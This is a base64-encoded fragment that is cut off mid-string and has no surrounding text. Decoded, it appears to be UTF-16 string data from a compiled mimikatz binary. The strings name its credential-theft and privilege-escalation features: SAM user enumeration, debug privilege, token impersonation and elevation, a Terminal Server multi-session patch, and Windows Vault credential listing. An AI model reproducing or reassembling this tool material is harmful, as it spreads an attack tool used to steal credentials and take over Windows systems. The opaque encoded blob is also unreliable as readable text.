AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4ARABvAG0AYQBpAG4AIABCAHUAaQBsAHQAaQBuACAAKAA/ACkAIAAlADAAOAB4AAoAAAAKAEQAbwBtAGEAaQBuACAAbgBhAG0AZQAgADoAIAAlAHcAWgAAAAAACgBEAG8AbQBhAGkAbgAgAFMASQBEACAAIAA6ACAAAAAKACAAJQAtADUAdQAgACUAdwBaAAAAAAAKACAAfAAgACUALQA1AHUAIAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEwAbwBvAGsAdQBwAEkAZABzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBHAGUAdABHAHIAbwB1AHAAcwBGAG8AcgBVAHMAZQByACAAJQAwADgAeAAAAAAAAAAAAAoAIAB8AGAAJQAtADUAdQAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEcAZQB0AEEAbABpAGEAcwBNAGUAbQBiAGUAcgBzAGgAaQBwACAAJQAwADgAeAAAAAAACgAgAHwAtAAlAC0ANQB1ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0AUgBpAGQAVABvAFMAaQBkACAAJQAwADgAeAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0ATwBwAGUAbgBVAHMAZQByACAAJQAwADgAeAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0ARQBuAHUAbQBlAHIAYQB0AGUAVQBzAGUAcgBzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEwAbwBvAGsAdQBwAEQAbwBtAGEAaQBuAEkAbgBTAGEAbQBTAGUAcgB2AGUAcgAgACUAMAA4AHgAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBEAG8AbQBhAGkAbgBzAEkAbgBTAGEAbQBTAGUAcgB2AGUAcgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEMAbwBuAG4AZQBjAHQAIAAlADAAOAB4AAoAAAAAAAAAAABBAHMAawAgAGQAZQBiAHUAZwAgAHAAcgBpAHYAaQBsAGUAZwBlAAAAZABlAGIAdQBnAAAAAAAAAFAAcgBpAHYAaQBsAGUAZwBlACAAbQBvAGQAdQBsAGUAAAAAAAAAAABwAHIAaQB2AGkAbABlAGcAZQAAAAAAAABQAHIAaQB2AGkAbABlAGcAZQAgACcAJQB1ACcAIABPAEsACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBpAHYAaQBsAGUAZwBlAF8AcwBpAG0AcABsAGUAIAA7ACAAUgB0AGwAQQBkAGoAdQBzAHQAUAByAGkAdgBpAGwAZQBnAGUAIAAoACUAdQApACAAJQAwADgAeAAKAAAAAAAAAFIAZQBzAHUAbQBlACAAYQAgAHAAcgBvAGMAZQBzAHMAAAAAAAAAAAByAGUAcwB1AG0AZQAAAAAAUwB1AHMAcABlAG4AZAAgAGEAIABwAHIAbwBjAGUAcwBzAAAAAAAAAHMAdQBzAHAAZQBuAGQAAABUAGUAcgBtAGkAbgBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzAAAAcwB0AG8AcAAAAAAAAAAAAFMAdABhAHIAdAAgAGEAIABwAHIAbwBjAGUAcwBzAAAAcwB0AGEAcgB0AAAAAAAAAEwAaQBzAHQAIABpAG0AcABvAHIAdABzAAAAAAAAAAAAaQBtAHAAbwByAHQAcwAAAEwAaQBzAHQAIABlAHgAcABvAHIAdABzAAAAAAAAAAAAZQB4AHAAbwByAHQAcwAAAFAAcgBvAGMAZQBzAHMAIABtAG8AZAB1AGwAZQAAAAAAVAByAHkAaQBuAGcAIAB0AG8AIABzAHQAYQByAHQAIAAiACUAcwAiACAAOgAgAAAATwBLACAAIQAgACgAUABJAEQAIAAlAHUAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAHMAdABhAHIAdAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAHIAZQBhAHQAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAATgB0AFQAZQByAG0AaQBuAGEAdABlAFAAcgBvAGMAZQBzAHMAAAAAAE4AdABTAHUAcwBwAGUAbgBkAFAAcgBvAGMAZQBzAHMAAAAAAAAAAABOAHQAUgBlAHMAdQBtAGUAUAByAG8AYwBlAHMAcwAAACUAcwAgAG8AZgAgACUAdQAgAFAASQBEACAAOgAgAE8ASwAgACEACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQBuAGUAcgBpAGMATwBwAGUAcgBhAHQAaQBvAG4AIAA7ACAAJQBzACAAMAB4ACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAbgBlAHIAaQBjAE8AcABlAHIAYQB0AGkAbwBuACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQBuAGUAcgBpAGMATwBwAGUAcgBhAHQAaQBvAG4AIAA7ACAAcABpAGQAIAAoAC8AcABpAGQAOgAxADIAMwApACAAaQBzACAAbQBpAHMAcwBpAG4AZwAAAAAAAAAlAHUACQAlAHcAWgAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAGEAbABsAGIAYQBjAGsAUAByAG8AYwBlAHMAcwAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGMAYQBsAGwAYgBhAGMAawBQAHIAbwBjAGUAcwBzACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBvAHAAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAKACUAdwBaAAAAAAAAAAAACgAJACUAcAAgAC0APgAgACUAdQAAAAAACQAlAHUAAAAJACAAAAAAAAkAJQBwAAAACQAlAFMAAAAJAC0APgAgACUAUwAAAAAACgAJACUAcAAgAC0APgAgACUAcAAJACUAUwAgACEAIAAAAAAAJQBTAAAAAAAAAAAAIwAlAHUAAABMAGkAcwB0ACAAcwBlAHIAdgBpAGMAZQBzAAAAAAAAAFMAaAB1AHQAZABvAHcAbgAgAHMAZQByAHYAaQBjAGUAAAAAAAAAAABzAGgAdQB0AGQAbwB3AG4AAAAAAAAAAABQAHIAZQBzAGgAdQB0AGQAbwB3AG4AIABzAGUAcgB2AGkAYwBlAAAAcAByAGUAcwBoAHUAdABkAG8AdwBuAAAAUgBlAHMAdQBtAGUAIABzAGUAcgB2AGkAYwBlAAAAAABTAHUAcwBwAGUAbgBkACAAcwBlAHIAdgBpAGMAZQAAAFMAdABvAHAAIABzAGUAcgB2AGkAYwBlAAAAAAAAAAAAUgBlAG0AbwB2AGUAIABzAGUAcgB2AGkAYwBlAAAAAABTAHQAYQByAHQAIABzAGUAcgB2AGkAYwBlAAAAAAAAAFMAZQByAHYAaQBjAGUAIABtAG8AZAB1AGwAZQAAAAAAJQBzACAAJwAlAHMAJwAgAHMAZQByAHYAaQBjAGUAIAA6ACAAAAAAAEUAUgBSAE8AUgAgAGcAZQBuAGUAcgBpAGMARgB1AG4AYwB0AGkAbwBuACAAOwAgAFMAZQByAHYAaQBjAGUAIABvAHAAZQByAGEAdABpAG8AbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABnAGUAbgBlAHIAaQBjAEYAdQBuAGMAdABpAG8AbgAgADsAIABJAG4AagBlAGMAdAAgAG4AbwB0ACAAYQB2AGEAaQBsAGEAYgBsAGUACgAAAAAAAABFAFIAUgBPAFIAIABnAGUAbgBlAHIAaQBjAEYAdQBuAGMAdABpAG8AbgAgADsAIABNAGkAcwBzAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgAG4AYQBtAGUAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAUwB0AGEAcgB0AGkAbgBnAAAAAAAAAAAAUgBlAG0AbwB2AGkAbgBnAAAAAAAAAAAAUwB0AG8AcABwAGkAbgBnAAAAAAAAAAAAUwB1AHMAcABlAG4AZABpAG4AZwAAAAAAUgBlAHMAdQBtAGkAbgBnAAAAAAAAAAAAUAByAGUAcwBoAHUAdABkAG8AdwBuAAAAUwBoAHUAdABkAG8AdwBuAAAAAAAAAAAAcwBlAHIAdgBpAGMAZQBzAC4AZQB4AGUAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBzAGUAcgB2AGkAYwBlAF8AcwBlAG4AZABjAG8AbgB0AHIAbwBsAF8AaQBuAHAAcgBvAGMAZQBzAHMAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAHMAZQBhAHIAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAZQByAHIAbwByACAAJQB1AAoAAAAAAAAATwBLACEACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBzAGUAcgB2AGkAYwBlAF8AcwBlAG4AZABjAG8AbgB0AHIAbwBsAF8AaQBuAHAAcgBvAGMAZQBzAHMAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAGMAcgBlAGEAdABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AcwBlAHIAdgBpAGMAZQBfAHMAZQBuAGQAYwBvAG4AdAByAG8AbABfAGkAbgBwAHIAbwBjAGUAcwBzACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBDAG8AZABlAFcAaQB0AHQAaABQAGEAdAB0AGUAcgBuAFIAZQBwAGwAYQBjAGUACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAHMAZQByAHYAaQBjAGUAXwBzAGUAbgBkAGMAbwBuAHQAcgBvAGwAXwBpAG4AcAByAG8AYwBlAHMAcwAgADsAIABOAG8AdAAgAGEAdgBhAGkAbABhAGIAbABlACAAdwBpAHQAaABvAHUAdAAgAFMAYwBTAGUAbgBkAEMAbwBuAHQAcgBvAGwACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBzAGUAcgB2AGkAYwBlAF8AcwBlAG4AZABjAG8AbgB0AHIAbwBsAF8AaQBuAHAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABNAGEAcgBrACAAYQBiAG8AdQB0ACAAUAB0AEgAAAAAAG0AYQByAGsAcgB1AHMAcwAAAAAAAAAAAEMAaABhAG4AZwBlACAAbwByACAAZABpAHMAcABsAGEAeQAgAGMAdQByAHIAZQBuAHQAIABkAGkAcgBlAGMAdABvAHIAeQAAAGMAZAAAAAAARABpAHMAcABsAGEAeQAgAHMAbwBtAGUAIAB2AGUAcgBzAGkAbwBuACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAHMAAAAAAAAAdgBlAHIAcwBpAG8AbgAAAAAAAAAAAAAAUwB3AGkAdABjAGgAIABmAGkAbABlACAAbwB1AHQAcAB1AHQALwBiAGEAcwBlADYANAAgAG8AdQB0AHAAdQB0AAAAAAAAAAAAYgBhAHMAZQA2ADQAAAAAAAAAAAAAAAAATABvAGcAIABtAGkAbQBpAGsAYQB0AHoAIABpAG4AcAB1AHQALwBvAHUAdABwAHUAdAAgAHQAbwAgAGYAaQBsAGUAAAAAAAAAAAAAAAAAAABTAGwAZQBlAHAAIABhAG4AIABhAG0AbwB1AG4AdAAgAG8AZgAgAG0AaQBsAGwAaQBzAGUAYwBvAG4AZABzAAAAcwBsAGUAZQBwAAAAAAAAAFAAbABlAGEAcwBlACwAIABtAGEAawBlACAAbQBlACAAYQAgAGMAbwBmAGYAZQBlACEAAAAAAAAAYwBvAGYAZgBlAGUAAAAAAAAAAAAAAAAAQQBuAHMAdwBlAHIAIAB0AG8AIAB0AGgAZQAgAFUAbAB0AGkAbQBhAHQAZQAgAFEAdQBlAHMAdABpAG8AbgAgAG8AZgAgAEwAaQBmAGUALAAgAHQAaABlACAAVQBuAGkAdgBlAHIAcwBlACwAIABhAG4AZAAgAEUAdgBlAHIAeQB0AGgAaQBuAGcAAAAAAAAAYQBuAHMAdwBlAHIAAAAAAEMAbABlAGEAcgAgAHMAYwByAGUAZQBuACAAKABkAG8AZQBzAG4AJwB0ACAAdwBvAHIAawAgAHcAaQB0AGgAIAByAGUAZABpAHIAZQBjAHQAaQBvAG4AcwAsACAAbABpAGsAZQAgAFAAcwBFAHgAZQBjACkAAAAAAGMAbABzAAAAUQB1AGkAdAAgAG0AaQBtAGkAawBhAHQAegAAAAAAAABlAHgAaQB0AAAAAAAAAAAAQgBhAHMAaQBjACAAYwBvAG0AbQBhAG4AZABzACAAKABkAG8AZQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlACAAbQBvAGQAdQBsAGUAIABuAGEAbQBlACkAAAAAAAAAUwB0AGEAbgBkAGEAcgBkACAAbQBvAGQAdQBsAGUAAABzAHQAYQBuAGQAYQByAGQAAAAAAAAAAABCAHkAZQAhAAoAAAAAAAAANAAyAC4ACgAAAAAAAAAAAAAAAAAAAAAACgAgACAAIAAgACgAIAAoAAoAIAAgACAAIAAgACkAIAApAAoAIAAgAC4AXwBfAF8AXwBfAF8ALgAKACAAIAB8ACAAIAAgACAAIAAgAHwAXQAKACAAIABcACAAIAAgACAAIAAgAC8ACgAgACAAIABgAC0ALQAtAC0AJwAKAAAAAABTAGwAZQBlAHAAIAA6ACAAJQB1ACAAbQBzAC4ALgAuACAAAAAAAAAARQBuAGQAIAAhAAoAAAAAAG0AaQBtAGkAawBhAHQAegAuAGwAbwBnAAAAAAAAAAAAVQBzAGkAbgBnACAAJwAlAHMAJwAgAGYAbwByACAAbABvAGcAZgBpAGwAZQAgADoAIAAlAHMACgAAAAAAAAAAAHQAcgB1AGUAAAAAAAAAAABmAGEAbABzAGUAAAAAAAAAaQBzAEIAYQBzAGUANgA0AEkAbgB0AGUAcgBjAGUAcAB0ACAAdwBhAHMAIAAgACAAIAA6ACAAJQBzAAoAAAAAAGkAcwBCAGEAcwBlADYANABJAG4AdABlAHIAYwBlAHAAdAAgAGkAcwAgAG4AbwB3ACAAOgAgACUAcwAKAAAAAAA2ADQAAAAAAAoAbQBpAG0AaQBrAGEAdAB6ACAAMgAuADAAIABhAGwAcABoAGEAIAAoAGEAcgBjAGgAIAB4ADYANAApAAoATgBUACAAIAAgACAAIAAtACAAIABXAGkAbgBkAG8AdwBzACAATgBUACAAJQB1AC4AJQB1ACAAYgB1AGkAbABkACAAJQB1ACAAKABhAHIAYwBoACAAeAAlAHMAKQAKAAAAAABDAHUAcgA6ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAHQAYQBuAGQAYQByAGQAXwBjAGQAIAA7ACAAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AZwBlAHQAQwB1AHIAcgBlAG4AdABEAGkAcgBlAGMAdABvAHIAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAATgBlAHcAOgAgACUAcwAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAdABhAG4AZABhAHIAZABfAGMAZAAgADsAIABTAGUAdABDAHUAcgByAGUAbgB0AEQAaQByAGUAYwB0AG8AcgB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABTAG8AcgByAHkAIAB5AG8AdQAgAGcAdQB5AHMAIABkAG8AbgAnAHQAIABnAGUAdAAgAGkAdAAuAAoAAAAAAAAAVQBuAGsAbgBvAHcAbgAAAEQAZQBsAGUAZwBhAHQAaQBvAG4AAAAAAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AAAAAAAAASQBkAGUAbgB0AGkAZgBpAGMAYQB0AGkAbwBuAAAAAABBAG4AbwBuAHkAbQBvAHUAcwAAAAAAAABSAGUAdgBlAHIAdAAgAHQAbwAgAHAAcgBvAGMAZQBzACAAdABvAGsAZQBuAAAAAAByAGUAdgBlAHIAdAAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABlACAAYQAgAHQAbwBrAGUAbgAAAGUAbABlAHYAYQB0AGUAAABMAGkAcwB0ACAAYQBsAGwAIAB0AG8AawBlAG4AcwAgAG8AZgAgAHQAaABlACAAcwB5AHMAdABlAG0AAAAAAAAARABpAHMAcABsAGEAeQAgAGMAdQByAHIAZQBuAHQAIABpAGQAZQBuAHQAaQB0AHkAAAAAAAAAAAB3AGgAbwBhAG0AaQAAAAAAVABvAGsAZQBuACAAbQBhAG4AaQBwAHUAbABhAHQAaQBvAG4AIABtAG8AZAB1AGwAZQAAAAAAAAB0AG8AawBlAG4AAAAAAAAAIAAqACAAUAByAG8AYwBlAHMAcwAgAFQAbwBrAGUAbgAgADoAIAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwB3AGgAbwBhAG0AaQAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACAAKgAgAFQAaAByAGUAYQBkACAAVABvAGsAZQBuACAAIAA6ACAAAABuAG8AIAB0AG8AawBlAG4ACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAHcAaABvAGEAbQBpACAAOwAgAE8AcABlAG4AVABoAHIAZQBhAGQAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAZABvAG0AYQBpAG4AYQBkAG0AaQBuAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlACAAOwAgAGsAdQBsAGwAXwBtAF8AbABvAGMAYQBsAF8AZABvAG0AYQBpAG4AXwB1AHMAZQByAF8AZwBlAHQAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgBTAEkARAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAcwB5AHMAdABlAG0AAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABOAG8AIAB1AHMAZQByAG4AYQBtAGUAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHcAaABlAG4AIABTAFkAUwBUAEUATQAKAAAAVABvAGsAZQBuACAASQBkACAAIAA6ACAAJQB1AAoAVQBzAGUAcgAgAG4AYQBtAGUAIAA6ACAAJQBzAAoAUwBJAEQAIABuAGEAbQBlACAAIAA6ACAAAAAAACUAcwBcACUAcwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwB0AG8AawBlAG4AXwBnAGUAdABOAGEAbQBlAEQAbwBtAGEAaQBuAEYAcgBvAG0AUwBJAEQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABrAHUAbABsAF8AbQBfAGwAbwBjAGEAbABfAGQAbwBtAGEAaQBuAF8AdQBzAGUAcgBfAEMAcgBlAGEAdABlAFcAZQBsAGwASwBuAG8AdwBuAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwByAGUAdgBlAHIAdAAgADsAIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAACUALQAxADAAdQAJAAAAAAAlAHMAXAAlAHMACQAlAHMAAAAAAAAAAAAJACgAJQAwADIAdQBnACwAJQAwADIAdQBwACkACQAlAHMAAAAAAAAAIAAoACUAcwApAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAXwBjAGEAbABsAGIAYQBjAGsAIAA7ACAAQwBoAGUAYwBrAFQAbwBrAGUAbgBNAGUAbQBiAGUAcgBzAGgAaQBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAlAHUACQAAACAALQA+ACAASQBtAHAAZQByAHMAbwBuAGEAdABlAGQAIAAhAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlAF8AYwBhAGwAbABiAGEAYwBrACAAOwAgAFMAZQB0AFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABwAGEAdABjAGgAIABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIAB0AG8AIABhAGwAbABvAHcAIABtAHUAbAB0AGkAcABsAGUAcwAgAHUAcwBlAHIAcwAAAAAAAABtAHUAbAB0AGkAcgBkAHAAAAAAAAAAAABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAG0AbwBkAHUAbABlAAAAAAB0AHMAAAAAAHQAZQByAG0AcwByAHYALgBkAGwAbAAAAFQAZQByAG0AUwBlAHIAdgBpAGMAZQAAAGQAbwBtAGEAaQBuAF8AZQB4AHQAZQBuAGQAZQBkAAAAZwBlAG4AZQByAGkAYwBfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQAAAGQAbwBtAGEAaQBuAF8AdgBpAHMAaQBiAGwAZQBfAHAAYQBzAHMAdwBvAHIAZAAAAGQAbwBtAGEAaQBuAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAAAAAABkAG8AbQBhAGkAbgBfAHAAYQBzAHMAdwBvAHIAZAAAAGcAZQBuAGUAcgBpAGMAAABCAGkAbwBtAGUAdAByAGkAYwAAAAAAAABQAGkAYwB0AHUAcgBlACAAUABhAHMAcwB3AG8AcgBkAAAAAAAAAAAAUABpAG4AIABMAG8AZwBvAG4AAAAAAAAARABvAG0AYQBpAG4AIABFAHgAdABlAG4AZABlAGQAAABEAG8AbQBhAGkAbgAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAAAAAARABvAG0AYQBpAG4AIABQAGEAcwBzAHcAbwByAGQAAABjAHIAZQBkAAAAAAAAAAAAVwBpAG4AZABvAHcAcwAgAFYAYQB1AGwAdAAvAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABtAG8AZAB1AGwAZQAAAHYAYQB1AGwAdAAAAAAAAAB2AGEAdQBsAHQAYwBsAGkAAAAAAAAAAABWYXVsdEVudW1lcmF0ZUl0ZW1UeXBlcwBWYXVsdEVudW1lcmF0ZVZhdWx0cwAAAABWYXVsdE9wZW5WYXVsdAAAVmF1bHRHZXRJbmZvcm1hdGlvbgAAAAAAVmF1bHRFbnVtZXJhdGVJdGVtcwAAAAAAVmF1bHRDbG9zZVZhdWx0AFZhdWx0RnJlZQAAAAAAAABWYXVsdEdldEl0ZW0AAAAACgBWAGEAdQBsAHQAIAA6ACAAAAAAAAAACQBJAHQAZQBtAHMAIAAoACUAdQApAAoAAAAAAAAAAAAJACAAJQAyAHUALgAJACUAcwAKAAAAAAAJAAkAVAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkATABhAHMAdABXAHIAaQB0AHQAZQBuACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkARgBsAGEAZwBzACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAkACQBSAGUAcwBzAG8AdQByAGMAZQAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBJAGQAZQBuAHQAaQB0AHkAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAbwByACAAIAAgADoAIAAAAAAAAAAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAlADIAdQAgACAAIAAgACAAOgAgAAAAAAAAAAkACQAqAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABvAHIAKgAgADoAIAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdAAgADsAIABWAGEAdQBsAHQARwBlAHQASQB0AGUAbQA3ACAAOgAgACUAMAA4AHgAAAAAAAkACQBQAGEAYwBrAGEAZwBlAFMAaQBkACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdAAgADsAIABWAGEAdQBsAHQARwBlAHQASQB0AGUAbQA4ACAAOgAgACUAMAA4AHgAAAAAAAoACQAJACoAKgAqACAAJQBzACAAKgAqACoACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0ACAAOwAgAFYAYQB1AGwAdABFAG4AdQBtAGUAcgBhAHQAZQBWAGEAdQBsAHQAcwAgADoAIAAwAHgAJQAwADgAeAAKAAAAAAAAAAAACQAJAFUAcwBlAHIAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAJQBzAFwAJQBzAAAAAAAAAAAAAAAAAAAAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQBcAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAAAAAAAAAAAAYgBnAFAAYQB0AGgAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIAAyACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAMQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG